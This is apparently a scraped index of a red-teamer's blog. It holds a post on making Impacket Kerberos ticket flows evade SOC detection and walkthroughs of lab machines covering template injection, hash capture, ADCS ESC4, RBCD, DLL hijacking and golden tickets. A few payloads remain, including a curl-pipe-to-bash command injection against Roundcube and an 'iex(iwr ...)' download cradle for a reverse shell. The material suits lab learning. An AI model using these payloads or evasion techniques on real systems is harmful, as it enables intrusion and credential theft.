[[{"l":"About","p":["Junior Red Teamer. Passionate about Windows binary exploitation.","Interested in:","EDR evasion and bypasses","Active Directory exploitation","Driver reversing and exploitation","Currently looking at:","Windows Userland Binary Exploitation","\"Fixing\" Impackets kerberos flow","More stuff coming soon :D"]}],[{"l":"Making Linux Kerberos Tickets Not Bad"},{"l":"Outline","p":["Small post about making kerberos ticket better from linux. Mainly focusing on opsec considerations and how to blend into normal traffic. Also going to modify an impacket script and write my own. I wont be covering the basics of kerberos or ADCS as its been done 100 times by people a lot better at writing blogs than I am (most of the stuff here will be covered in the links below):","Kerberos: https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html","For those that dont like reading: https://www.youtube.com/watch?v=byykEId3FUs&ab_channel=scrt.insomnihack","Things I’m going to cover.","Ticket flow when using impacket (and how to make it not sus)","Multiple tickets in one ccache file"]},{"l":"Ticket Flow When Using Impacket","p":["So lets say you have a high privileged account in AD, Domain admin or a service account running as a DA or something. So you start to run psexec to login to boxes and grab stuff, secretsdump to dump hashes from the domain, creating a user account as a domain admin to flex in the report. What does impacket actually do when you do this?","Quick assumptions - You have the plain text pwd, ntlm hash and aes256 key (random but it’ll be used later)","Every time you run a script specifying kerberos and passing in a TGT impacket with use this TGT to request a TGS, for wmiexec it will request a CIFS ticket, then a HOST ticket four times. This is because impacket is not saving the ticket in memory and requesting a new one everytime.","This is strange in the context of a normal user doing normal user stuff, as in windows the tickets would be stored within the LUID. So the first time a TGT is requested it will be saved and used to request a TGS which will be also be saved in the LUID. When connecting to the service Windows will provide all the needed TGS tickets (or create new ones by providing the TGT). To mimic this on Linux we have to first request a TGT then request the TGS tickets and save them all to one file."]},{"i":"multiple-tickets-in-one-ccache-file","l":"Multiple Tickets In One Ccache File.","p":["You will soon come to realise that this is harder then it seems. If you request a CIFS ticket then pass that it makes it a bit better, but will instead change the SPN of the CIFS ticket to be a HOST ticket and use that in memory. (It will also request it multiple times). Requesting the CIFS ticket from the TGT, and validating it:","Then using this ticket for wmiexec.py:","This is a bit better, but still weird from the logs. As it would show that the user requested a TGT then a CIFS TGS then authenticated with a HOST ticket, that just appeared out of nowhere. Will a SOC be monitoring this? maybe idk I’m not a SOC Analyst, but if they are lets get rid of that and do it properly.","One possible way around this is to request the HOST ticket but not use it in the ccache. This will stop the “It appeared out of nowhere” detection chance, but I still don’t like it as the ticket generation time will be different. I want to give the SOC absolutely nothing to detect on. :D","Lets dive into the ccache structure and see if we can inject a second TGS.","https://web.mit.edu/kerberos/krb5-1.12/doc/basic/ccache_def.html","credentials, plural meaning multiple. (please dont be a typo) So it is doable!","Going back to the structure of a TGS it will have a bunch of header stuff and then the actual TGS as shown here: https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/kerberos-authentication","The structure will be: Username, Session Key encrypted stuff then TGS. So if we can extract out just the TGS and slap it onto the end of the ccache file it should be fine?","So how do we find the length of this header vaule?","I used impacket’s ccache.py file cause that seemed like a good place to start, and checked the length of the ticket before and after the header is passed out. For both the TGT and CIFS tickets the difference is 60 (This will change based on the length of the SPN and client).","So cutting off the first 60bytes and pray for the best.","Lol it worked."]},{"i":"mergeticketpy","l":"mergeTicket.py","p":["Time to write an impacket script to merge tickets for us! (I dont think this has already been done)","To start with I’m going to pass in 2 tickets and check if the spn is different, username is the same and if its for the same server.","Next is to just merge the tickets. I’m going to use the crude way of just reading in 60 bytes then writing it out to a file.","Nice! it works.","Now to update the script to work for any number of tickets.","And proof it works:","Here is the script if you want to laugh at my python code (or use the script): https://github.com/ElJayRight/impacket/blob/master/examples/mergeTicket.py","A final show of the new workflow with the new script:","Request a TGT:","Request LDAP, HOST and CIFS tickets","Merge the tickets.","Then run secretsdump (ldap) and wmiexec (cifs and host):","It works!!"]},{"l":"Fin","p":["So I didnt end up modifing an impacket script, so thats to come soon. I’m planning on updating getST to allow for both multiple SPNs and to save to a single file. There are still other opsec things to consider that I didnt mention. I’ll probs cover these in the second post."]}],[{"l":"Anubis","p":["Fun AD box, starts with Template Injection which leads to landing in a docker container. From here there is a pivot to an internal web app which can be manipulated to leak a users NTLMv2 hash. This hash cracks and the user can authenticate to SMB where there is a vulnerable version of Jamovi running which allows for a XSS to RCE CVE. The final step is abusing ESC4 to get Administrator on the box."]},{"l":"Enumeration"},{"l":"Nmap","p":["dns name:"]},{"l":"SMB","p":["domain name and hostname."]},{"l":"HTTPS","p":["Some people which could be mapped to usernames:","reflected content on the submit form.","Trying ssti and it errors!"]},{"i":"foothold---template-injection","l":"Foothold - Template Injection","p":["As its an asp page I'm going to try vbs","This works and shows that we are running as system. Checking this hostname against what we got from netexec.","This outputs as webserver01 so its probs a container or something.","Going to use a tcp one liner to get a reverse shell. https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcpOneLine.ps1","Hosting the file locally then downloading it with an iex cradle.","This gives us a shell !"]},{"i":"foothold---enumeration","l":"Foothold - Enumeration","p":["On The administrators desktop there is a certificate","Analysing the cert with openssl shows another hostname:","Running nslookup on the host shows it resolves to 172.22.96.1, which is the gateway (again showing this is a docker container).","Next step is to drop chisel and set up a pivot.","chisel on the attack machine:","chisel on the windows box:"]},{"l":"Internal WebApp","p":["quick port scan shows that smb and http are open:","curling the website shows that there is an install.asp page that expects an ip.","Going to start responder and then send a request with the ip pointing to my machine. This works and gives back a hash:","This cracks with hashcat to give Secret123. Using this we can now enumerate smb.","There is the CertEnroll share which means ADCS is installed which means certipy."]},{"l":"ADCS Enumeration","p":["There is a template for web where the webdevelopers have write propery over the certificate, meaning we can modify the cert to allow user authentication. As it already has EnrolleeSuppliesSubject we can specify any user.","Going to dump ldap to see what users are in the webdevelopers group.","So we need to get to the Diego Cruz user."]},{"l":"Jamovi XSS CVE","p":["Going back to smb and checking the shared folder, there is a file called Whatif.omv that seems to be being updated.","Downloading and unzipping the file shows that the file is created by jamovi 1.6.16.0 which has a xss to rce CVE: https://github.com/g33xter/CVE-2021-28079","Running the exploit gives us a shell as diegocruz. :D"]},{"l":"ESC4","p":["As we are now a member of the webdevelopers group we can modify the template to allow for user auth. For this I'm going to use this script: https://github.com/cfalta/PoshADCS/blob/master/ADCS.ps1 which converts a template into the format needed to request a smartcard cert (pfx).","We can check this worked by running certify on the box:","Final step is to request the cert, get a tgt then psexec in:","root.txt:"]},{"i":"things-to-learn--look-into","l":"Things to learn / look into","p":["How to request a cert for the current user on windows, this means I wouldnt have to drop certify on the box to request the cert.","VBS revshell - instead of calling out to a ps1 file and executing it with CreateObject(WScript.Shell).exec(). This would also give me greater control over the process running my revshell.","I'm probs going to do the box again soonish with the above stuff included as it would make it more fun and challenging."]}],[{"l":"Heron","p":["IPs: 10.10.172.101 10.10.172.102"]},{"l":"Recon","p":["Also checking where the dc with nslookup:","Also gives the hostname of MUCDC.heron.vl","As im still not sure what website this controls im going to quickly fuzz for vhosts:","As there is no need to do any fancy opsec stuff, I'm just going to iex a powershell revtcp oneliner. (not adding shell.ps1 as it triggers chromes AV scanner :|)","As we can read the SYSVOL going to see if there is a gpp password.","As we have root on the linux box and its domain joined we can extract the ntlm hash from the /etc/krb5.keytab file then configure RBCD and request a ticket.","As we still dont have domain credentials we could try to asreproast:","At this stage I tried a few different ways to forward a port so I dont have to use the jump box to stage and catch a shell but nothing seemed to work.","Checking shares again with this user shows that we can read and write to accounting$","Checking the home directory shows two domain users:","Checking the shares shows that there is an accounting$ share that could be interesting.","Cracking the hash with hashcat gives us domain creds!","Fin","Going to password spray again to see if there is password reuse.","Going to password spray to see if this password has been reused as it looks like a generic domain password.","Going to set up a socks proxy over ssh when logging in, which should be useful later on.","In the share there is a web.config file. This can be used to backdoor the application and gain RCE in the context of the IIS server. This is a good post if you want more information: https://soroush.me/blog/2019/08/uploading-web-config-for-fun-and-profit-2/","Logging into the home$ share as this user gives us more creds in a .lnk file.","Now is probs a good time to run bloodhound.","Port 80: Looking at the website gives us a more usernames:","So going to the path gimmieshell.pls should give us a rev shell back. The annoying thing is going to be doing this all via the socks proxy, as the webapp wont be able to talk directly to our box.","The domain admin is called _admin and the adm_prju user has WriteAccountRestrictions over the domain controller. This means we can configure RBCD for the DC and request a ticket on behalf of a domain admin.","The new web.config:","The shell is super unstable but that doesnt matter as looking shows there is a file with ssh creds!","The ssh login gives us a host name also implying that the box is domain joined.","Then going to http://accounting.heron.vl/shell.me to trigger the payload.","Then logging in with wmiexec:","This chain starts as an assumed breach with on ssh open on the 10.10.172.102 jump box.","This user is also in the sudo group and can run ALL ALL as root.","This worked!! Now we are:","Uploading the new web.config and using python3 and nc on the jump box to stage and catch the reverse shell.","We are given the following credentials:","What we can do is open up 2 reverse port forwards from the jump box to us. One for the payload download, and the other for a shell.","With this we can check for some common ports on the domain controller."]},{"l":"Beyond Root","p":["Very fun chain, really liked how you didnt really need to rely on any fancy AD tricks till the end. I wanted to try to backdoor the web.config file without having to override the current configuration of the webapp but couldnt find a way.","When looking at the way others solved the box the ssh.ps1 file was unintended. The correct way was to use the .krb5login and to backdoor ssh to get the login password. You could also have used the aduit group that svc-web-accounting is in to set up rbcd on the jumpbox, which would have given root.","Someone also mentioned you can hijack the dll in the accounting$ share and gain a shell that way.","As there is a bunch of stuff to try I'm going to leave it for now and post another writeup going over this with a focus on DLL Proxying."]}],[{"l":"Hybrid","p":["IPs: 10.10.215.165 10.10.215.166"]},{"l":"Recon","p":["Nmap: 10.10.215.166 mail01.hybrid.vl","10.10.215.165","There is a roundcube instance listening on port 80.","rpcbind and nfs are open, going to check nfs shares:"]},{"l":"RoundCube CVE","p":["Mounting the share shows a backup file.","The dovecot-users has credentials!","Logging in with the admin account and looking around shows a few interesting things.","The application version is: Roundcube Webmail 1.6.1 and the markasjunk plugin is installed.","There is an advisory talking about how the markasjunk extension can be used to get RCE: https://ssd-disclosure.com/ssd-advisory-roundcube-markasjunk-rce/","\"The vulnerability can be triggered by any Roundcube user who can change his email identity as well as mark an email as junk, both being trivial requirements.\"","There is also a nice POC: admintouch${IFS}test.txt@roundcube.com","So something like curl${IFS}http://10.8.0.110:8080/shell.sh|bash should work.","There is a black list for the : char, so going to have to decode via b64 instead.","This works giving a shell as www-data on the box."]},{"l":"NFS privesc","p":["Looking around shows that there is another user called: peter.turner@hybrid.vl on the box. Using this you can privesc to this user via nfs by manipulating the UIDs.","To do this we need to get a copy of bash off the target then create a new user with the same id as peter.turner@hybrid.vl.","Then we can bash back to the share and mark it as a setuid:","Then to privesc: /opt/share/bash -p and we are peter.turner","There is a keepass db, using the password from before gives domain creds:","This user can run ALL ALL as root, so root on mail01!"]},{"l":"Domain Admin","p":["As this box is domain joined, we can read the keytab file to get the machine hash:","Looking for quick wins with ADCS:","Requesting a certificate as administrator:","Then requesting a TGT:","This shows that PKINIT is not set up for this Domain, instead we can request a certificate for the domain controller and set up rbcd for a domain admin.","Convert the pfx to cert and key:","Configure RBCD:","Request a ticket.","login with wmiexec:","TaDa!"]},{"l":"Beyond Root","p":["Overall a really nice box, there a two things that I would like to change tho,","Remove RBCD","Request a TGT then HOST and CIFS Service Tickets before authing to wmiexec.","Both these are easy to do.","To remove RBCD I found out you can just specify flush_rbcd in passthecert","For the proper kerberos flow I requested a TGT for mail01$ then requested a cifs ticket."]}],[{"l":"Trusted","p":["IPs: 10.10.217.117 10.10.217.118"]},{"l":"Recon","p":["Nmap: 10.10.217.117 trusteddc.trusted.vl","10.10.217.118 labdc.lab.trusted.vl","Seems to be a parent and child domain which will be interesting.","Checking port 80 shows that xampp XAMPP for Windows 8.1.6 is running, this has a webdav exploit https://github.com/ruthvikvegunta/XAMPP-WebDAV-Exploit but the endpoint doesn't seem to exist.","Fuzzing with ffuf shows a /dev endpoint:"]},{"l":"Foothold","p":["On the main page there is a note:","The URI path for the website also looks very interesting:","Using this we are able to read arb files:","Fuzzing again shows a file called db.php","Which has db creds:","Logging into the db gives creds!","Throwing these in hashcat gives:"]},{"l":"Lateral movement to ewalters","p":["Looking at shares, there isnt anything interesting we can read, so going to run bloodhound.","Bloodhound shows that our user can forcechange the password of ewalters. So lets do that.","Then checking that it is set.","Nice! We can also login with winrm"]},{"l":"DLL Hijack to DA","p":["Looking around there is an AVTest directory with two files: kasperskyremovaltool.exe and readme.txt","The note mentions another user is expected to run this program:","A potential privesc would be to see if we can dll hijack this application and get a reverse shell as the user running the application which should be an admin as AVTools love there high privs. :)","To check for this you can load up procmon and check for missing imports, there are heaps of resources on how to do this.","https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dll-hijacking","Do this you will see that the application tries to load KasperskyRemovalToolENU.dll a few times. So if we make a dll and call it KasperskyRemovalToolENU.dll and place it in the same location as the kasperskyremovaltool.exe we will get a shell.","Being lazy and using msfvenom:","Uploading the file and waiting a bit we get a shell as cpowers that happens to be a domain admin on the machine."]},{"l":"Forest Privesc","p":["Going back to bloodhound shows that there is a parent domain called trusted.vl to priv esc into this domain and get enterprise admin we can grab the krbtgt hash for lab.trusted.vl and forge a golden ticket. To get this we can just do a dcsync on the dc with mimikatz.","We also need the domain sid of both domains, both available from bloodhound.","We can use the default Enterprise Admin groups SID being <domain_sid>-519","Now to form the ticket:","Then login with psexec:",":D !"]},{"l":"Beyond Root","p":["Fun box, good opportunity for a reminder on how to go from a child domain to parent domain. There is an easy way to cheese half this lab tho.","You can write a file to the webroot in mysql and skip the lateral movement and privesc on the first box. You can do this as by default mysql will allow you to write a file to disk.","Then you can just iex(iwr http://server/file.ps1) to get a revshell."]}]]